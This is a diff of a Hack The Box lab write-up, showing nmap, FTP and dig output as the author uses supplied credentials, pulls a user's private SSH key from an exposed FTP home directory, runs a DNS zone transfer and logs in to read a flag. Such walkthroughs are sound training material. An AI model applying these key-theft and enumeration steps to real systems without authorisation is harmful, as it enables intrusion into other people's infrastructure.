@@ -5,8 +5,11 @@
 The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production.
 Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum.
 The administrators have stored a flag.txt file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof."
+
 ---
+
 So we start with the creds **ceil:qwerty1234**. Let's take a look at the machine and see what we got.
+
 ```
 Nmap scan report for 10.129.117.172                                         
 Host is up (0.14s latency).                                                 
@@ -49,11 +52,14 @@ Nmap done: 1 IP address (1 host up) scanned in 97.26 seconds
 
 We have 4 ports open. FTP, SSH, DNS, and then seemingly a second FTP server. The one on port 2121 Has a custom banner of `Ceils FTP`.
 Let's first try our creds on SSH
+
 ```
 samr@samr-virtual-machine:~$ ssh ceil@10.129.117.172 -P 2121
 ceil@10.129.117.172: Permission denied (publickey).
 ```
+
 Looks like password authentication is disabled, so we need to have a private key to connect to ssh. However, it looks like we can use `Ceils FTP` on port 2121 with our provided credentials to access the file server.
+
 ```
 $ ftp ceil@10.129.4.60 2121
 Connected to 10.129.4.60.
@@ -69,7 +75,9 @@ ftp> ls
 226 Transfer complete
 ftp>
 ```
+
 There seems to be nothing in the files share. However....
+
 ```
 ftp> ls -la
 229 Entering Extended Passive Mode (|||36532|)
@@ -86,7 +94,9 @@ drwx------   2 ceil     ceil         4096 Nov 10  2021 .ssh
 226 Transfer complete
 ftp>
 ```
+
 If we use the `ls -la` command to list hidden items, we can see the the ftp servers root directory is the home directory for the Ceil user. This is a big security no no. Since we have access to the home directory, we can read the private key contents in `.ssh`.
+
 ```
 ftp> cd .ssh
 250 CWD command successful
@@ -106,7 +116,9 @@ local: id_rsa remote: id_rsa
 3381 bytes received in 00:00 (45.46 KiB/s)
 ftp>
 ```
+
 So we can now login with ssh. But before we do that, I do want to test the dns service as well, as the machine is a dns server.
+
 ```
 $ dig any inlanefreight.htb @10.129.117.172
 
@@ -138,7 +150,9 @@ ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
 ;; WHEN: Thu Dec 05 10:03:01 EST 2024
 ;; MSG SIZE  rcvd: 437
 ```
+
 Looks like we get a name server. Let's test for zone transfer.
+
 ```
 $ dig axfr inlanefreight.htb @10.129.117.172
 
@@ -159,10 +173,12 @@ inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefr
 ;; WHEN: Thu Dec 05 10:06:05 EST 2024
 ;; XFR size: 10 records (messages 1, bytes 540)
 ```
+
 And yes, it appears we can perform a zone transfer. We would count this as a finding to the company.
 Now let's login as Ceil. First we'll change the permissions on our id_rsa
 `chmod 600 id_rsa`
 And login with ssh
+
 ```
 $ ssh ceil@10.129.117.172 -i id_rsa
 Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)
@@ -192,7 +208,9 @@ To check for new updates run: sudo apt update
 Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
 ceil@NIXEASY:~$
 ```
+
 And boom! We're in! Now to find the flag.txt file. The first thing that grabs my attention in Ceil's home directory is her `.bash_history` file. Let's take a little peak.
+
 ```
 ls -al
 mkdir ssh
@@ -221,7 +239,9 @@ cat flag.txt
 ls -al
 mv flag/flag.txt .
 ```
+
 Looks like she made the flag.txt! It looks like she made a directory called `/home/flag` and placed the flag.txt there.
+
 ```
 ceil@NIXEASY:~$ cd /home
 ceil@NIXEASY:/home$ ls                                                                                                  ceil  cry0l1t3  flag
@@ -230,4 +250,5 @@ ceil@NIXEASY:/home/flag$ ls                                                     
 ceil@NIXEASY:/home/flag$ cat flag.txt                                                                                   HTB{<redacted>}
 ceil@NIXEASY:/home/flag$
 ```
+
 And with that, this box is solved!
